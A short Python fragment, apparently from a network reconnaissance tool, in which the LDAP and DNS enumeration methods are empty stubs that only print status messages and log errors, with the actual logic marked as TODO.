        try:
            print("\n[*] Enumerating LDAP...")
            if self.current_session and self.current_session.get('domain'):
                # TODO: Implement LDAP enumeration
                pass
        except Exception as e:
            self.log_error(f"LDAP enumeration error: {str(e)}")
            
    def _enumerate_dns(self):
        """Enumerate DNS"""
        try:
            print("\n[*] Enumerating DNS...")
            if self.current_session and self.current_session.get('domain'):
                # TODO: Implement DNS enumeration
                pass
        except Exception as e:
            self.log_error(f"DNS enumeration error: {str(e)}") 